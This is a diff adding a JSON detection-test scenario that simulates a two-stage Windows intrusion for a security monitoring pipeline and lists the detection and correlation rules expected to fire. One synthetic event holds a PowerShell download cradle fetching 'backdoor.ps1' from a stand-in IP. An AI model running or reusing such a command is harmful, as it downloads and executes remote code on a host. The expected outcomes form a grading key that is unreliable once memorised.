@@ -1,0 +1,66 @@
+{
+  "scenario_id": "SCN-09-MULTI-STAGE-INTRUSION",
+  "version": "1.0.0",
+  "name": "Multi-Stage Synthetic Intrusion Timeline",
+  "description": "Full intrusion lifecycle: Discovery (whoami) followed by execution (PowerShell cradle) on the same host within 15 minutes.",
+  "objective": "Verify corr_recon_to_execution correlation triggers and aggregates full incident timeline.",
+  "category": "multi_stage",
+  "is_negative_case": false,
+  "required_telemetry_sources": [
+    "windows"
+  ],
+  "required_canonical_fields": [
+    "hostname",
+    "process_name"
+  ],
+  "attack_technique_ids": [
+    "T1033",
+    "T1059.001"
+  ],
+  "synthetic_events": [
+    {
+      "event_id": "f9b8f4f4-a18d-424b-babb-24606c52a709",
+      "timestamp": "2026-10-17T08:40:00Z",
+      "ingest_timestamp": "2026-10-17T08:40:01Z",
+      "source_type": "windows",
+      "source_name": "sysmon",
+      "event_type": "process_creation",
+      "hostname": "srv-lab-target.lab.local",
+      "username": "lab_victim",
+      "process_name": "whoami.exe",
+      "command_line": "whoami.exe /priv",
+      "severity": "low"
+    },
+    {
+      "event_id": "412de6bc-d617-457a-9d0d-6c79ed54d90b",
+      "timestamp": "2026-10-17T08:42:00Z",
+      "ingest_timestamp": "2026-10-17T08:42:01Z",
+      "source_type": "windows",
+      "source_name": "sysmon",
+      "event_type": "process_creation",
+      "hostname": "srv-lab-target.lab.local",
+      "username": "lab_victim",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -enc Invoke-WebRequest -Uri http://198.51.100.88/backdoor.ps1",
+      "severity": "high"
+    }
+  ],
+  "expected_detection_rules": [
+    "proc_cmd_whoami",
+    "proc_powershell_download"
+  ],
+  "unexpected_detection_rules": [],
+  "expected_correlation_rules": [
+    "corr_recon_to_execution"
+  ],
+  "expected_incident_severity": "critical",
+  "expected_risk_band": "Medium",
+  "expected_triage_severity": "critical",
+  "expected_investigation_hypotheses": [
+    "Multi-stage attack sequence: discovery followed by payload retrieval"
+  ],
+  "expected_uncertainty_or_gaps": [
+    "Network tap telemetry unavailable for backdoor download payload"
+  ],
+  "cleanup_policy": "session_rollback"
+}
